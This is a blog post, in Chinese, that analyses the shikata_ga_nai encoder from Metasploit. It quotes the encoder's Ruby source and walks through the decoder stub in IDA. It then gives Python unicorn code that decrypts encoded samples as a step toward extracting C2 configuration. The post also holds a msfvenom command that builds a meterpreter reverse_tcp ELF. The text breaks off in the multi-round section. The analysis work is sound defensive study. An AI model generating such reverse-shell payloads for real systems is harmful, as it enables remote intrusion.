<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="msf-shikata_ga_nai编码分析与C2配置信息提取"><meta name="keywords" content="reverse,软件安全"><meta name="author" content="Alex"><meta name="copyright" content="Alex"><title>msf-shikata_ga_nai编码分析与C2配置信息提取 | Alex's blog~</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Alex's blog~" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#shikata-ga-nai%E7%BC%96%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">shikata_ga_nai编码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ELF%E6%A0%B7%E6%9C%AC"><span class="toc-number">1.1.</span> <span class="toc-text">ELF样本</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#x86"><span class="toc-number">1.1.1.</span> <span class="toc-text">x86</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8D%95%E8%BD%AE%E8%BF%AD%E4%BB%A3"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">单轮迭代</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A4%9A%E8%BD%AE%E8%BF%AD%E4%BB%A3"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">多轮迭代</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#x64"><span class="toc-number">1.1.2.</span> <span class="toc-text">x64</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PE%E6%A0%B7%E6%9C%AC"><span class="toc-number">1.2.</span> <span class="toc-text">PE样本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C2%E4%BF%A1%E6%81%AF%E6%8F%90%E5%8F%96"><span class="toc-number">2.</span> <span class="toc-text">C2信息提取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PE%E6%A0%B7%E6%9C%AC-1"><span class="toc-number">2.1.</span> <span class="toc-text">PE样本</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#32%E4%BD%8D"><span class="toc-number">2.1.1.</span> <span class="toc-text">32位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#64%E4%BD%8D"><span class="toc-number">2.1.2.</span> <span class="toc-text">64位</span></a></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://pic4.zhimg.com/80/v2-5cb1e2bdc0644f9828029a94181f4542_1440w.jpg"></div><div class="author-info__name text-center">Alex</div><div class="author-info__description text-center">pwn</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">31</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">31</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">1</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://n0vice.top/">N0vice</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://snowywar.top/">魔法少女雪殇</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://l0ne1y.xyz/">L0ne1y</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://eeeeeeeeeeeeeeeea.cn/">eeeeeeeeeeeeeeeea</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://giles-one.github.io/">cat03</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://ulrica66666.github.io/">ulrica66666</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Alex's blog~</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">文章</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">分类</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">msf-shikata_ga_nai编码分析与C2配置信息提取</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2024-01-24</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="shikata-ga-nai编码"><a href="#shikata-ga-nai编码" class="headerlink" title="shikata_ga_nai编码"></a>shikata_ga_nai编码</h2><h3 id="ELF样本"><a href="#ELF样本" class="headerlink" title="ELF样本"></a>ELF样本</h3><h4 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h4><h5 id="单轮迭代"><a href="#单轮迭代" class="headerlink" title="单轮迭代"></a>单轮迭代</h5><p>在Linux平台下分析，生成一份x86下的恶意样本，其中<code>-i</code>参数指定迭代轮数，我们先迭代一轮，便于分析：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> msfvenom  -p  linux/x86/meterpreter/reverse_tcp  LHOST=192.168.7.34 LPORT=4444 -e x86/shikata_ga_nai -i 1  -f elf &gt; x86_encoder.elf</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/01/13/ztKNUhaekFjBGn4.png" alt=""></p>
<p>载入ida：</p>
<p><img src="https://s2.loli.net/2024/01/13/rX5HwLSp3UNWOyo.png" alt=""></p>
<p>下面还有一堆数据，应该是采用了SMC混淆。</p>
<blockquote>
<p>SMC：Self Modifying Code</p>
<p>即自修改代码，简而言之就是程序中的部分代码在运行前是被加密成一段数据，不可反编译，通过程序运行后执行相关解码代功能，对加密的代码数据进行解密，让其恢复正常功能。</p>
<p>下面是伪代码演示一种SMC的典型应用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">proc main:</span><br><span class="line">............</span><br><span class="line">IF .运行条件满足</span><br><span class="line">  CALL DecryptProc （Address of MyProc）;对某个函数代码解密</span><br><span class="line">  ........</span><br><span class="line">  CALL MyProc                           ;调用这个函数</span><br><span class="line">  ........</span><br><span class="line">  CALL EncryptProc （Address of MyProc）;再对代码进行加密，防止程序被Dump</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">end main</span><br></pre></td></tr></table></figure>
</blockquote>
<p>解混淆也比较简单，可以动态调试，或者直接dump内存。</p>
<p>但是都挺麻烦的，对于单个样本适用，但是如果想要自动化的一起处理多个样本就比较麻烦了。</p>
<p>其实可以用unicorn处理，只进行模拟解密部分的代码就可以，还不需要搭建沙箱环境。</p>
<p>先观察Metasploit是怎么处理这部分编码的，源码在：<a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/modules/encoders/x86/shikata_ga_nai.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/encoders/x86/shikata_ga_nai.rb</a></p>
<p>核心代码如下：<br><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_shikata_block</span><span class="params">(state, length, cutoff)</span></span></span><br><span class="line">    <span class="comment"># 声明逻辑寄存器</span></span><br><span class="line">    count_reg = Rex::Poly::LogicalRegister::X86.new(<span class="string">&#x27;count&#x27;</span>, <span class="string">&#x27;ecx&#x27;</span>)</span><br><span class="line">    addr_reg  = Rex::Poly::LogicalRegister::X86.new(<span class="string">&#x27;addr&#x27;</span>)</span><br><span class="line">    key_reg = <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果上下文编码可用，使用 mov reg, [addr]</span></span><br><span class="line">    <span class="keyword">if</span> state.context_encoding</span><br><span class="line">      key_reg = Rex::Poly::LogicalRegister::X86.new(<span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;eax&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      key_reg = Rex::Poly::LogicalRegister::X86.new(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 声明各个块</span></span><br><span class="line">    endb = Rex::Poly::SymbolicBlock::End.new</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 清零计数器寄存器</span></span><br><span class="line">    clear_register = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;clear_register&#x27;</span>,</span><br><span class="line">      <span class="string">&quot;\x31\xc9&quot;</span>,  <span class="comment"># xor ecx,ecx</span></span><br><span class="line">      <span class="string">&quot;\x29\xc9&quot;</span>,  <span class="comment"># sub ecx,ecx</span></span><br><span class="line">      <span class="string">&quot;\x33\xc9&quot;</span>,  <span class="comment"># xor ecx,ecx</span></span><br><span class="line">      <span class="string">&quot;\x2b\xc9&quot;</span>)  <span class="comment"># sub ecx,ecx</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化计数器</span></span><br><span class="line">    init_counter = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;init_counter&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将长度除以四，但确保它在块大小（4字节）边界上对齐</span></span><br><span class="line">    length += <span class="number">4</span> + (<span class="number">4</span> - (length &amp; <span class="number">3</span>)) &amp; <span class="number">3</span></span><br><span class="line">    length /= <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (length &lt;= <span class="number">255</span>)</span><br><span class="line">      init_counter.add_perm(<span class="string">&quot;\xb1&quot;</span> + [ length ].pack(<span class="string">&#x27;C&#x27;</span>))</span><br><span class="line">    <span class="keyword">elsif</span> (length &lt;= <span class="number">65536</span>)</span><br><span class="line">      init_counter.add_perm(<span class="string">&quot;\x66\xb9&quot;</span> + [ length ].pack(<span class="string">&#x27;v&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      init_counter.add_perm(<span class="string">&quot;\xb9&quot;</span> + [ length ].pack(<span class="string">&#x27;V&#x27;</span>))</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 密钥初始化块</span></span><br><span class="line">    init_key = <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果使用上下文编码，使用 mov reg, [addr]</span></span><br><span class="line">    <span class="keyword">if</span> state.context_encoding</span><br><span class="line">      init_key = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;init_key&#x27;</span>,</span><br><span class="line">        Proc.new &#123; <span class="params">|b|</span> (<span class="number">0xa1</span> + b.regnum_of(key_reg)).chr + <span class="string">&#x27;XORK&#x27;</span>&#125;)</span><br><span class="line">    <span class="comment"># 否则，直接使用 mov reg, val</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      init_key = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;init_key&#x27;</span>,</span><br><span class="line">        Proc.new &#123; <span class="params">|b|</span> (<span class="number">0xb8</span> + b.regnum_of(key_reg)).chr + <span class="string">&#x27;XORK&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># XOR 和 ADD 操作的处理函数</span></span><br><span class="line">    xor  = Proc.new &#123; <span class="params">|b|</span> <span class="string">&quot;\x31&quot;</span> + (<span class="number">0x40</span> + b.regnum_of(addr_reg) + (<span class="number">8</span> * b.regnum_of(key_reg))).chr &#125;</span><br><span class="line">    add  = Proc.new &#123; <span class="params">|b|</span> <span class="string">&quot;\x03&quot;</span> + (<span class="number">0x40</span> + b.regnum_of(addr_reg) + (<span class="number">8</span> * b.regnum_of(key_reg))).chr &#125;</span><br><span class="line"></span><br><span class="line">    sub4 = Proc.new &#123; <span class="params">|b|</span> sub_immediate(b.regnum_of(addr_reg), -<span class="number">4</span>) &#125;</span><br><span class="line">    add4 = Proc.new &#123; <span class="params">|b|</span> add_immediate(b.regnum_of(addr_reg), <span class="number">4</span>) &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (datastore[<span class="string">&quot;BufferRegister&quot;</span>])</span><br><span class="line"></span><br><span class="line">      buff_reg = Rex::Poly::LogicalRegister::X86.new(<span class="string">&#x27;buff&#x27;</span>, datastore[<span class="string">&quot;BufferRegister&quot;</span>])</span><br><span class="line">      offset = (datastore[<span class="string">&quot;BufferOffset&quot;</span>] ? datastore[<span class="string">&quot;BufferOffset&quot;</span>].to_i : <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">if</span> ((offset &lt; -<span class="number">255</span> <span class="keyword">or</span> offset &gt; <span class="number">255</span>) <span class="keyword">and</span> state.badchars.<span class="keyword">include</span>? <span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">        raise EncodingError.new(<span class="string">&quot;Can&#x27;t generate NULL-free decoder with a BufferOffset bigger than one byte&quot;</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      mov = Proc.new &#123; <span class="params">|b|</span></span><br><span class="line">        <span class="comment"># mov &lt;buff_reg&gt;, &lt;addr_reg&gt;</span></span><br><span class="line">        <span class="string">&quot;\x89&quot;</span> + (<span class="number">0xc0</span> + b.regnum_of(addr_reg) + (<span class="number">8</span> * b.regnum_of(buff_reg))).chr</span><br><span class="line">      &#125;</span><br><span class="line">      add_offset = Proc.new &#123; <span class="params">|b|</span> add_immediate(b.regnum_of(addr_reg), offset) &#125;</span><br><span class="line">      sub_offset = Proc.new &#123; <span class="params">|b|</span> sub_immediate(b.regnum_of(addr_reg), -offset) &#125;</span><br><span class="line"></span><br><span class="line">      getpc = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;getpc&#x27;</span>)</span><br><span class="line">      getpc.add_perm(Proc.new&#123; <span class="params">|b|</span> mov.call(b) + add_offset.call(b) &#125;)</span><br><span class="line">      getpc.add_perm(Proc.new&#123; <span class="params">|b|</span> mov.call(b) + sub_offset.call(b) &#125;)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># 对于偏移小于四，inc 操作的大小比 add 小或相等</span></span><br><span class="line">      <span class="keyword">if</span> (offset &gt; <span class="number">0</span> <span class="keyword">and</span> offset &lt; <span class="number">4</span>)</span><br><span class="line">        getpc.add_perm(Proc.new&#123; <span class="params">|b|</span> mov.call(b) + inc(b.regnum_of(addr_reg))*offset &#125;)</span><br><span class="line">      <span class="keyword">elsif</span> (offset &lt; <span class="number">0</span> <span class="keyword">and</span> offset &gt; -<span class="number">4</span>)</span><br><span class="line">        getpc.add_perm(Proc.new&#123; <span class="params">|b|</span> mov.call(b) + dec(b.regnum_of(addr_reg))*(-offset) &#125;)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      getpc.add_perm(Proc.new&#123; <span class="params">|b|</span></span><br><span class="line">        <span class="keyword">if</span> (offset &lt; -<span class="number">255</span> <span class="keyword">or</span> offset &gt; <span class="number">255</span>)</span><br><span class="line">          <span class="comment"># lea addr_reg, [buff_reg + DWORD offset]</span></span><br><span class="line">          <span class="comment"># 这将生成 NULL 字节</span></span><br><span class="line">          <span class="string">&quot;\x8d&quot;</span> + (<span class="number">0x80</span> + b.regnum_of(buff_reg) + (<span class="number">8</span> * b.regnum_of(addr_reg))).chr + [offset].pack(<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line">        <span class="keyword">elsif</span> (offset &gt; -<span class="number">255</span> <span class="keyword">and</span> offset != <span class="number">0</span> <span class="keyword">and</span> offset &lt; <span class="number">255</span>)</span><br><span class="line">          <span class="comment"># lea addr_reg, [buff_reg + byte offset]</span></span><br><span class="line">          <span class="string">&quot;\x8d&quot;</span> + (<span class="number">0x40</span> + b.regnum_of(buff_reg) + (<span class="number">8</span> * b.regnum_of(addr_reg))).chr + [offset].pack(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="comment"># lea addr_reg, [buff_reg]</span></span><br><span class="line">          <span class="string">&quot;\x8d&quot;</span> + (b.regnum_of(buff_reg) + (<span class="number">8</span> * b.regnum_of(addr_reg))).chr</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># BufferReg+BufferOffset 指向缓冲区的开头</span></span><br><span class="line">      xor1 = Proc.new &#123; <span class="params">|b|</span> xor.call(b) + [ (b.offset_of(endb) - cutoff) ].pack(<span class="string">&#x27;c&#x27;</span>) &#125;</span><br><span class="line">      xor2 = Proc.new &#123; <span class="params">|b|</span> xor.call(b) + [ (b.offset_of(endb) - <span class="number">4</span> - cutoff) ].pack(<span class="string">&#x27;c&#x27;</span>) &#125;</span><br><span class="line">      add1 = Proc.new &#123; <span class="params">|b|</span> add.call(b) + [ (b.offset_of(endb) - cutoff) ].pack(<span class="string">&#x27;c&#x27;</span>) &#125;</span><br><span class="line">      add2 = Proc.new &#123; <span class="params">|b|</span> add.call(b) + [ (b.offset_of(endb) - <span class="number">4</span> - cutoff) ].pack(<span class="string">&#x27;c&#x27;</span>) &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="comment"># FPU 块</span></span><br><span class="line">      fpu = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;fpu&#x27;</span>,</span><br><span class="line">        *fpu_instructions)</span><br><span class="line"></span><br><span class="line">      fnstenv = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;fnstenv&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;\xd9\x74\x24\xf4&quot;</span>)</span><br><span class="line">      fnstenv.depends_on(fpu)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># 从堆栈上获取 EIP</span></span><br><span class="line">      getpc = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;getpc&#x27;</span>,</span><br><span class="line">        Proc.new &#123; <span class="params">|b|</span> (<span class="number">0x58</span> + b.regnum_of(addr_reg)).chr &#125;)</span><br><span class="line">      getpc.depends_on(fnstenv)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># 减去 fpu 指令的偏移量，因为这是 fnstenv 之后 eip 指向的地方</span></span><br><span class="line">      xor1 = Proc.new &#123; <span class="params">|b|</span> xor.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - cutoff) ].pack(<span class="string">&#x27;c&#x27;</span>) &#125;</span><br><span class="line">      xor2 = Proc.new &#123; <span class="params">|b|</span> xor.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - <span class="number">4</span> - cutoff) ].pack(<span class="string">&#x27;c&#x27;</span>) &#125;</span><br><span class="line">      add1 = Proc.new &#123; <span class="params">|b|</span> add.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - cutoff) ].pack(<span class="string">&#x27;c&#x27;</span>) &#125;</span><br><span class="line">      add2 = Proc.new &#123; <span class="params">|b|</span> add.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - <span class="number">4</span> - cutoff) ].pack(<span class="string">&#x27;c&#x27;</span>) &#125;</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解码器循环块</span></span><br><span class="line">    loop_block = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;loop_block&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    loop_block.add_perm(</span><br><span class="line">      Proc.new &#123; <span class="params">|b|</span> xor1.call(b) + add1.call(b) + sub4.call(b) &#125;,</span><br><span class="line">      Proc.new &#123; <span class="params">|b|</span> xor1.call(b) + sub4.call(b) + add2.call(b) &#125;,</span><br><span class="line">      Proc.new &#123; <span class="params">|b|</span> sub4.call(b) + xor2.call(b) + add2.call(b) &#125;,</span><br><span class="line">      Proc.new &#123; <span class="params">|b|</span> xor1.call(b) + add1.call(b) + add4.call(b) &#125;,</span><br><span class="line">      Proc.new &#123; <span class="params">|b|</span> xor1.call(b) + add4.call(b) + add2.call(b) &#125;,</span><br><span class="line">      Proc.new &#123; <span class="params">|b|</span> add4.call(b) + xor2.call(b) + add2.call(b) &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Loop 指令块</span></span><br><span class="line">    loop_inst = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;loop_inst&#x27;</span>,</span><br><span class="line">      <span class="string">&quot;\xe2\xf5&quot;</span>)</span><br><span class="line">      <span class="comment"># 在当前实现中，循环块的大小是常量，因此不需要进行复杂的计算。然而，这里是一种方法：</span></span><br><span class="line">      <span class="comment">#Proc.new &#123; |b|</span></span><br><span class="line">      <span class="comment">#	# loop &lt;loop_block label&gt;</span></span><br><span class="line">      <span class="comment">#	# -2 用于考虑这条指令的大小</span></span><br><span class="line">      <span class="comment">#	&quot;\xe2&quot; + [ -2 - b.size_of(loop_block) ].pack(&#x27;c&#x27;)</span></span><br><span class="line">      <span class="comment">#&#125;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义块依赖关系</span></span><br><span class="line">    clear_register.depends_on(getpc)</span><br><span class="line">    init_counter.depends_on(clear_register)</span><br><span class="line">    loop_block.depends_on(init_counter, init_key)</span><br><span class="line">    loop_inst.depends_on(loop_block)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">      <span class="comment"># 生成具有保存 ECX、ESP 和用户定义寄存器的排列</span></span><br><span class="line">      loop_inst.generate(block_generator_register_blacklist, <span class="literal">nil</span>, state.badchars)</span><br><span class="line">    <span class="keyword">rescue</span> RuntimeError, EncodingError =&gt; e</span><br><span class="line">      <span class="comment"># Rex::Poly 块生成器可能引发 RuntimeError 变体</span></span><br><span class="line">      raise EncodingError, e.to_s</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  ......</span><br></pre></td></tr></table></figure></p>
<p>其实可以发现，其生成的代码来说，有很多种组合，例如对于清空ecx就有如下四种组合：<br><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">clear_register = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;clear_register&#x27;</span>,</span><br><span class="line">  <span class="string">&quot;\x31\xc9&quot;</span>,  <span class="comment"># xor ecx,ecx</span></span><br><span class="line">  <span class="string">&quot;\x29\xc9&quot;</span>,  <span class="comment"># sub ecx,ecx</span></span><br><span class="line">  <span class="string">&quot;\x33\xc9&quot;</span>,  <span class="comment"># xor ecx,ecx</span></span><br><span class="line">  <span class="string">&quot;\x2b\xc9&quot;</span>)  <span class="comment"># sub ecx,ecx</span></span><br></pre></td></tr></table></figure></p>
<p>但是对于shikata_ga_nai编码来说，可以发现一条硬编码：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fnstenv = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;fnstenv&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;\xd9\x74\x24\xf4&quot;</span>)</span><br><span class="line">      fnstenv.depends_on(fpu)</span><br></pre></td></tr></table></figure>
<p>这个可以作为识别shikata_ga_nai编码的重要特征，fnstenv指令用来保存 FPU 处理器的当前状态。</p>
<p>通过处理FPU处理器的当前状态可以很方便的获取到IP寄存器的值，由于没法直接通过<code>mov eax, eip</code>这种方法获取IP寄存器的值，可以通过FPU来获取。</p>
<p><img src="https://s2.loli.net/2024/01/13/X4jvlDctzoBLYwJ.png" alt=""></p>
<p>可以看到IP相对于FPU的偏移在12处，那么ida中经过如下指令，会将上一条浮点指令的地址最终存入edx中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOAD:08048054                 mov     ebx, 0ACAABAECh		# ebx作为密钥</span><br><span class="line">LOAD:08048059                 fcmovnb st, st(2)</span><br><span class="line">LOAD:0804805B                 fnstenv byte ptr [esp-0Ch]</span><br><span class="line">LOAD:0804805F                 pop     edx</span><br></pre></td></tr></table></figure>
<p>然后随后的指令：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOAD:08048060                 sub     ecx, ecx</span><br><span class="line">LOAD:08048062                 mov     cl, 1Fh</span><br><span class="line">LOAD:08048064                 sub     edx, 0FFFFFFFCh</span><br><span class="line">LOAD:08048067                 xor     [edx+11h], ebx</span><br><span class="line">LOAD:0804806A                 add     ebx, [edx+11h]</span><br></pre></td></tr></table></figure></p>
<p>会将ecx清空，然后将ecx寄存器赋值为0x1F，这个作为循环次数。</p>
<p>然后会将edx减去-4（其实就是edx += 4），然后会将edx的值加上一定偏移处的内存以4字节为单位和ebx寄存器的值进行异或，随后动态的更新ebx的值。</p>
<p>其实ebx的值就是作为异或的密钥，不过不是一成不变的，而是动态更新的，每次都会加上一定的值进行密钥更新。</p>
<p>那么可以用unicorn模拟程序执行进行解密，核心代码如下，其中反汇编引擎可以采用capstone，实测比pwntools的disasm效果要好：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secret = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span>  </span><br><span class="line">    eip = mu.reg_read(UC_X86_REG_EIP)</span><br><span class="line">    <span class="keyword">global</span> secret</span><br><span class="line">    <span class="keyword">if</span> eip == <span class="number">0x08048059</span>: </span><br><span class="line">        <span class="comment"># 获取秘钥</span></span><br><span class="line">        secret = mu.reg_read(UC_X86_REG_EBX)</span><br><span class="line">        print(<span class="string">&#x27;secret key:&#x27;</span> + <span class="built_in">hex</span>(secret))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> eip == <span class="number">0x08048067</span>:</span><br><span class="line">        ecx = mu.reg_read(UC_X86_REG_ECX)</span><br><span class="line">        edx = mu.reg_read(UC_X86_REG_EDX)</span><br><span class="line">        print(<span class="string">&#x27;ecx:&#x27;</span> + <span class="built_in">hex</span>(ecx))</span><br><span class="line">        print(<span class="string">&#x27;edx:&#x27;</span> + <span class="built_in">hex</span>(edx))</span><br><span class="line">        <span class="comment"># 记忆化存储最开始的edx的值</span></span><br><span class="line">        memorize_start_edx = edx</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ecx):</span><br><span class="line">            <span class="comment"># 获取[edx+11h]的四个字节</span></span><br><span class="line">            mem_data = mu.mem_read(edx + <span class="number">0x11</span>, <span class="number">4</span>)</span><br><span class="line">            mem_value = u32(mem_data)</span><br><span class="line">            <span class="comment"># 解密处理</span></span><br><span class="line">            result = mem_value ^ secret</span><br><span class="line">            <span class="comment"># 写回内存</span></span><br><span class="line">            mu.mem_write(edx + <span class="number">0x11</span>, p32(result))</span><br><span class="line">            <span class="comment"># 动态秘钥更新</span></span><br><span class="line">            secret += u32(mu.mem_read(edx + <span class="number">0x11</span>, <span class="number">0x4</span>)) </span><br><span class="line">            secret = secret &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            edx += <span class="number">4</span></span><br><span class="line"></span><br><span class="line">        code = mu.mem_read(memorize_start_edx + <span class="number">0x11</span>, <span class="number">0x100</span>)</span><br><span class="line">        code = code.rstrip(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">        disassemble_mem(code, <span class="number">0x0</span>)</span><br><span class="line">        mu.emu_stop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">mu.emu_start(<span class="number">0x8048054</span>, <span class="number">0x8048054</span> + <span class="number">0x200</span>)</span><br></pre></td></tr></table></figure>
<p>运行如下：<br><img src="https://s2.loli.net/2024/01/13/K5PaEsbCAovgLGW.png" alt=""></p>
<p>gdb动态调试解密后代码如下：</p>
<p><img src="https://s2.loli.net/2024/01/13/zFjQPoSRZAGDi3X.png" alt=""></p>
<p>可以发现最终得到了解密后的代码，关于C2配置提取，则同无编码的样本一样。</p>
<p>至此可以得到1轮迭代后的样本了，下面来分析多轮迭代后的样本。</p>
<h5 id="多轮迭代"><a href="#多轮迭代" class="headerlink" title="多轮迭代"></a>多轮迭代</h5><p>多轮迭代中，用unicorn在执行过程中会出现一些错误，猜测应该是模拟栈的时候出现了一些问题，但是可以采用静态分析的方法，开发一个解密器出来。</p>
<p>多轮迭代无非是增加了解密的轮数，其加密模式是重复的，就是套娃，我们需要解开第一层，然后再解第二层，重复此模式即可。</p>
<p>可以发现，每进行一轮迭代，shellcode长度就会增加27：</p>
<p><img src="https://s2.loli.net/2024/01/13/PDdcF7SUEwIlp3u.png" alt=""></p>
